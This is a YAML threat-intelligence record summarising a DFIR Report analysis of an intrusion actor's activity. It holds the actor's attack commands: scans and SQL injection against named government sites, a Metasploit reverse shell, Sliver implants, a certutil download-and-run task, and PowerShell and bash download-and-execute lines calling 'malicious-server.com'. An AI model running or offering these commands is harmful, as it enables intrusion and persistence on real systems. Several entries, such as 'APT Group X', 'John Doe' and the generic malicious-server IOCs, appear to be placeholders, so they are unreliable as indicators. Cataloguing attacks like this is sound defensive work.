@@ -1,0 +1,138 @@
+description: 'The report details a cyber threat involving the exploitation of vulnerabilities
+  in public-facing applications, leading to malware deployment and command-and-control
+  activities.
+
+  '
+attribution:
+- Unknown
+- APT Group X
+TTPs:
+  processes:
+  - httpx
+  - nuclei
+  - subfinder
+  - amass
+  - sqlmap
+  - ghauri
+  - Metasploit
+  - Sliver
+  - weevely
+  - SharPersist
+  - xmrig
+  - powershell.exe
+  - cmd.exe
+  - bash
+  commandline:
+  - echo "AS4758" | httpx --status-code --tech-detect
+  - echo "AS142501" | httpx --status-code --tech-detect -o 142501
+  - echo "AS17813" | httpx --status-code --tech-detect -o 17813
+  - echo "AS55566" | httpx --status-code --tech-detect -o 55566
+  - echo "AS55566" | httpx --status-code --tech-detect -o 55566.txt
+  - echo "AS17813" | httpx --status-code --tech-detect -o 17813.TXT
+  - echo "AS4758" | httpx --status-code --tech-detect -proxy socks5://localhost:1080
+    -o AS4748
+  - nuclei -l sept24.txt -o sept24_op.txt -s critical,high
+  - nuclei -l sept24.txt -o sept24_op.txt -s medium
+  - nuclei -l telco_again_subfinder -o telco_again_subfinder_nuclei_scan -as
+  - nuclei -l rac_drdo_il_govnet -o rac_drdo_il_govnet_18-sept-23_op -s critical,high
+  - nuclei -l co_nic_gov -o co_nic_gov_proxy_output -s critical -proxy socks5://localhost:1080
+  - torify nuclei -u mossad.gov.il -o mossad.gov.il_new
+  - torify nuclei -u shabak.gov.il -o shabak.gov.il_new
+  - torify nuclei -l large_scope -o large_scope -s critical,high
+  - torify nuclei -l large_scope -o large_scope -as
+  - subfinder -dL drones -o drone_op -silent
+  - shodan search 'vuln="CVE-2022-42475"' --fields ip_str,port --separator " " | awk
+    '{print $1":"$2}'|tee -a temp123.txt
+  - torify sqlmap -u https://<domain>.gov.bd/admin/manage_user.php?id=1 -v 2 --delay
+    1.7 --time-sec 13 --tamper space2comment --risk 3 --level 5 --random-agent --no-cast
+    --parse-errors --dbs
+  - torify ghauri -u "https://<domain>.<domain>.in/products/all-products?category=CATMAPF0CE"
+    --dbs
+  - set payload linux/x64/meterpreter/reverse_tcp
+  - set lhost 192.169.6.122
+  - set lport 4451
+  - exploit
+  - generate --mtls 192.169.6.122 --save /root --os linux
+  - generate --mtls 192.169.6.122 --save /root --os windows
+  - sc create winmo displayname=discord binpath=C:\\programdata\\mdsn\\svchost.exe
+    start=auto
+  - schtasks /create /RL HIGHEST /RU "NT AUTHORITY\\SYSTEM" /sc minute /mo 30 /tn
+    "schdsWin" /tr "cmd.exe /C certutil.exe -urlcache -f http://192.169.6.122:6770/svchost.exe
+    %systemdrive%\\Windows\\Temp\\svchost.exe & %systemdrive%\\Windows\\Temp\\svchost.exe"
+  - schtasks /run /TN "schdsWin"
+  - powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command
+    "Invoke-WebRequest http://malicious-server.com/script.ps1 -OutFile script.ps1;
+    .\script.ps1"
+  - cmd.exe /c start "" "C:\Windows\System32\cmd.exe" /c powershell.exe -ExecutionPolicy
+    Bypass -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest http://malicious-server.com/script.ps1
+    -OutFile script.ps1; .\script.ps1"
+  - bash -c "curl -O http://malicious-server.com/script.sh && bash script.sh"
+  powershell:
+  - powershell -c iex(Set-MpPreference -DisableRealtimeMonitoring $true)
+  - powershell -c Invoke-adPEAS
+  - powershell -c Get-Service
+  - powershell -c (Get-WMIObject -class Win32_ComputerSystem)
+  - powershell -c Get-Domain
+  - powershell -c echo %UERNAME%
+  - powershell -c (Invoke-adPEAS -Domain REDACTED.local)
+  - powershell -c (Get-WMIObject)
+  - Invoke-WebRequest http://malicious-server.com/script.ps1 -OutFile script.ps1;
+    .\script.ps1
+  - New-Object System.Net.WebClient).DownloadString("http://malicious-server.com/payload.txt")
+    | Invoke-Expression
+  scripting_engine:
+  - .bashrc
+  - autominionlx.sh
+  - xmrig
+  - curl -O http://malicious-server.com/script.sh && bash script.sh
+  registry_keys:
+  - HKLM\Software\Microsoft\Windows\CurrentVersion\Run\MaliciousService
+  image_load:
+  - powershell.exe -> C:\Windows\System32\kernel32.dll
+  network_connections:
+  - 192.169.6.122:4451
+  - 192.169.6.122:6770
+  - powershell.exe -> http://malicious-server.com:80
+  - cmd.exe -> http://malicious-server.com:80
+  - bash -> http://malicious-server.com:80
+  file_activity:
+  - /root/exploits/CVE-2023-25157.py
+  - /root/exploits/CVE-2023-2982.py
+  - C:\\programdata\\mdsn\\svchost.exe
+  - '%systemdrive%\\Windows\\Temp\\svchost.exe'
+  - C:\Windows\Temp\script.ps1
+  - /tmp/script.sh
+  persistence:
+  - 'Web Shell: weevely webshell uploaded to http://<domain>.gov.bd/img_upload/user/ddos.php'
+  - 'Service Execution: Sliver execute-assembly to load SharPersist, creating a Windows
+    service called HealthCheck to run encoded PowerShell.'
+  - 'Scheduled Task: Sliver SharPersist used to create a scheduled task also called
+    HealthCheck to run C:\\ProgramData\\Software\\svchost.exe'
+  - Scheduled Task
+  - Service Execution
+  pipes:
+  - \Device\NamedPipe\MaliciousPipe
+  process_relations:
+  - httpx -> nuclei -> subfinder -> amass -> sqlmap -> ghauri -> Metasploit -> Sliver
+  - powershell.exe -> cmd.exe -> bash
+IOCs:
+  hashes:
+  - sha1:3e16029c5ebca479460c24ff72e5e50670efabcd
+  IPs:
+  - 103.174.104.51
+  domains:
+  - malicious-server.com
+  URLs:
+  - http://malicious-server.com/script.ps1
+  - http://malicious-server.com/payload.txt
+authors:
+- '@svch0st'
+- '@pcsc0ut'
+- UC1
+- John Doe
+malware_families:
+- Weevely
+- SharPersist
+reference: https://thedfirreport.com/2023/12/18/lets-opendir-some-presents-an-analysis-of-a-persistent-actors-activity/
+date_of_publication: December 18, 2023
+file_creation_date: July 28, 2025
